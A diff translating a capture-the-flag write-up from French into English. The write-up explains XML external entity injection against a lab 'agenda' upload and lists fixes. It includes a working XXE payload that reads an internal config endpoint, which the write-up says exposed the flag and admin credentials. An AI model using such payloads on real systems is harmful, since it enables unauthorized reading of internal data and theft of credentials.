@@ -1,39 +1,39 @@
 # 6 - INJECTION XML
 
-## qu'est ce que c'est
+## what is it
 
-Le format XML permet de définir des entités : des raccourcis réutilisables dans un document, un peu comme des variables. La norme XML permet aussi de déclarer des entités externes, qui vont chercher leur contenu ailleurs — sur le disque local, ou même sur le réseau.
+The XML format allows the definition of entities: reusable shortcuts in a document, similar to variables. The XML standard also allows the declaration of external entities, which look for their content elsewhere — on the local disk or even on the network.
 
-Si une application analyse un fichier XML fourni par l’utilisateur (upload, appel API, flux SOAP...) avec un parseur dont cette fonctionnalité n’a pas été désactivée, l’utilisateur peut définir ses propres entités externes, et le parseur va aller chercher ce qu’elles pointent — ce n’est plus juste de la donnée, c’est une instruction.
-## comment acceder au flag
+If an application parses an XML file provided by the user (upload, API call, SOAP flow, etc.) with a parser whose feature has not been disabled, the user can define their own external entities, and the parser will fetch what they point to. This is no longer just data; it is an instruction.
 
-apres avoir trouver la faille avec la methode PATCH, un indice nous est laisse par "emilie" disant que l'agenda XML n'est pas valide cote server-side
+## how to access the flag
+
+After discovering the vulnerability using the PATCH method, an indication is left by "Emilie" saying that the XML agenda is not valid server-side.
 
 ![XML](Resources/XML.png)
 
-cet indice nous fait comprendre qu'il faut faire une injection XML dans l'agenda, on utilise donc un autre fichier .xml qui extrait des informations contenues dans /internal/config (indice laisse par robots.txt et par le dashboard)
+This clue tells us that we must perform an XML injection in the agenda. We therefore use another .xml file that extracts information from /internal/config (an indicator left in robots.txt and on the dashboard).
 
 ![XML](Resources/XML2.png)
 
-EXEMPLE DE SCRIPT :
+EXAMPLE SCRIPT:
 ```xml
-    <?xml version="1.0"?>
-    <!DOCTYPE agenda [
-    <!ENTITY xxe SYSTEM "http://localhost:4942/internal/config">
-    ]>
-    <agenda>
-    <event>
-        <title>&xxe;</title>
-        <date>2042-01-15</date>
-    </event>
-    </agenda>
+<?xml version="1.0"?>
+<!DOCTYPE agenda [
+<!ENTITY xxe SYSTEM "http://localhost:4942/internal/config">
+]>
+<agenda>
+<event>
+    <title>&xxe;</title>
+    <date>2042-01-15</date>
+</event>
+</agenda>
 ```
 
-apres avoir importe le fichier, on obtient le nouveau flag ainsi que des login admin qui va nous servir juste apres
-
+After importing the file, we obtain the new flag, along with admin login information that will be useful right after.
 
 ![XML](Resources/XML3.png)
 
-## comment solutionner le probleme
+## how to fix the problem
 
-Valider les inputs de l’utilisateur, désactiver l’usage de fichiers xml externes si pas nécessaire, utiliser des parsers pour éviter les dérives malicieuses et ne pas donner trop d’informations en cas d’erreur.
+Validate user inputs, disable the use of external XML files when unnecessary, use secure parsers to prevent malicious behavior, and avoid exposing too much information in error cases.
